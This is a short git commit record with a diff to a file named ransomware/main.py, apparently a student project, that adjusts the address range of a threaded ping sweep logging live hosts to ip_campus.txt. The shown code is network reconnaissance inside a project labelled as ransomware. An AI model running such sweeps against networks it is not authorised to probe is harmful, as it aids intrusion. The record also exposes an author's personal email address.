7c412a5416c31e9b6bee6488db406183f3c7ee8b
waxes27 <nceba.dumasi@gmail.com>
2022-06-23 14:11:04 +0200

    update to ux

--- ransomware/main.py
+++ ransomware/main.py
@@ -9,7 +9,7 @@ os.system("touch ip_campus.txt")
 def ip_threading(i):
     for x in range(200):
         for floor in range(20):
-            ip = subprocess.getoutput(f"ping -c 1 20.20{floor+4}.{i}.{x}")
+            ip = subprocess.getoutput(f"ping -c 1 20.20{floor}.{i}.{x}")
             try:
                 print(re.findall(r"\d{2}.\d{3}.\d{1,}.\d{1,}",ip)[0])
             except IndexError:
